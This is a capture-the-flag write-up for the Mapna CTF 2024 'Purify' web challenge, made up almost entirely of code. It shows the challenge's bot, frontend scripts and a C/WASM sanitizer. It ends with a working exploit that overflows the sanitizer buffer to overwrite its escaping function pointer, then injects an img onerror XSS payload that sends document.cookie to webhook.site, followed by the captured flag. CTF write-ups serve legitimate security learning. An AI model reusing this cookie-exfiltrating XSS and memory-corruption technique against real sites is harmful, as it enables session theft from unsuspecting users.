# Mapna CTF 2024 writeup

> 原文: https://www.ctfiot.com/158808.html
> ID: 158808


```
$ tree .
.
├── purify
│   ├── app
│   │   ├── nginx.conf
│   │   └── static
│   │   ├── css
│   │   │   └── style.css
│   │   ├── index.html
│   │   ├── js
│   │   │   ├── purify.js
│   │   │   └── script.js
│   │   └── purify.wasm
│   ├── bot
│   │   ├── Dockerfile
│   │   └── stuff
│   │   ├── bot.js
│   │   ├── index.js
│   │   ├── package-lock.json
│   │   ├── package.json
│   │   └── static
│   │   └── index.html
│   ├── docker-compose.yaml
│   └── purify.c
└── purify_206ec7c8d65c88cb617775a62bc5ab9bcfaa7baa.txz

8 directories, 15 files
```



```
#!/usr/bin/env node
const puppeteer = require('puppeteer')

const flag = process.env.FLAG || 'MAPNA{test-flag}';

async function visit(url){
 let browser;

 if(!/^https?:\/\//.test(url)){
 return;
 }

 try{
 browser = await puppeteer.launch({
 pipe: true,
 args: [
 "--no-sandbox",
 "--disable-setuid-sandbox",
 "--ignore-certificate-errors",
 ],
 executablePath: "/usr/bin/google-chrome-stable",
 headless: 'new'
 });

 let page = await browser.newPage();
 await page.setCookie({
 name: 'flag',
 value: flag,
 domain: 'web',
 httpOnly: false,
 secure: false,
 sameSite: 'Lax'
 });
 await page.goto(url,{ waitUntil: 'domcontentloaded', timeout: 2000 });
 await new Promise(r=>setTimeout(r,5000));
 }catch(e){ console.log(e) }
 try{await browser.close();}catch(e){}
 process.exit(0)
}

visit(JSON.parse(process.argv[2]))
```



```
index.html
<!DOCTYPE html>
<html>
<head>
 <meta charset="utf-8">
 <title>Purify</title>
 <script src="./js/purify.js"></script>
 <link href="./css/style.css" rel="stylesheet"/>
</head>
<body>
</body>
 <div>
 <h2>Received messages:</h2>
 <ul id="list">
 </ul>
 </div>
 <script src="./js/script.js"></script>
</html>
```



```
// script.js
window.onmessage = e=>{
 list.innerHTML += `
 <li>From ${e.origin}: ${window.DOMPurify.sanitize(e.data.toString())}</li>
 `
}

setTimeout(_=>window.postMessage("hi",'*'),1000)
```



```
// purify.js
async function init() {
 window.wasm = (await WebAssembly.instantiateStreaming(
 fetch('./purify.wasm')
 )).instance.exports
}

function sanitize(dirty) {
 wasm.set_mode(0) 

 for(let i=0;i<dirty.length;i++){
 wasm.add_char(dirty.charCodeAt(i))
 }

 let c
 let clean = ''
 while((c = wasm.get_char()) != 0){
 clean += String.fromCharCode(c)
 }

 return clean
}

window.DOMPurify = { 
 sanitize,
 version: '1.3.7'
}

init()
```



```
// clang --target=wasm32 -emit-llvm -c -S ./purify.c && llc -march=wasm32 -filetype=obj ./purify.ll && wasm-ld --no-entry --export-all -o purify.wasm purify.o
struct globalVars {
 unsigned int len;
 unsigned int len_r;
 char buf[0x1000];
 int (*is_dangerous)(char c);
} g;

int escape_tag(char c){
 if(c == '<' || c == '>'){
 return 1;
 } else {
 return 0;
 }
}

int escape_attr(char c){
 if(c == '\'' || c == '"'){
 return 1;
 } else {
 return 0;
 }
}

int hex_escape(char c,char *dest){
 dest[0] = '&';
 dest[1] = '#';
 dest[2] = 'x';
 dest[3] = "0123456789abcdef"[(c&0xf0)>>4];
 dest[4] = "0123456789abcdef"[c&0xf];
 dest[5] = ';';
 return 6;
}

void add_char(char c) {
 if(g.is_dangerous(c)){
 g.len += hex_escape(c,&g.buf[g.len]);
 } else {
 g.buf[g.len++] = c;
 }
}

int get_char(char f) {
 if(g.len_r < g.len){
 return g.buf[g.len_r++];
 }
 return '\0';
}

void set_mode(int mode) {
 if(mode == 1){
 g.is_dangerous = escape_attr;
 } else {
 g.is_dangerous = escape_tag;
 }
}
```



```
<script>
let w = window.open('http://web');
setTimeout(() => {
 w.postMessage('A'.repeat(0x1000) + '\x01<', '*');
}, 100);
</script>
```



```
let c
 let clean = ''
 while((c = wasm.get_char()) != 0){
 clean += String.fromCharCode(c)
 }
```



```
<script>
let w = window.open('http://web');
setTimeout(() => {
 w.postMessage("A".repeat(0x1000) + '\x01\x00\x00\x00' + '<img src=x onerror=location.assign([`http://webhook.site/…?`,document.cookie])>', '*');
 w.postMessage('a', '*');
 w.postMessage('a', '*');
 w.postMessage('a', '*');
}, 100);
</script>
```



```
MAPNA{e22e0bf86e0813d9d3c7ae3f8022e41d}
```
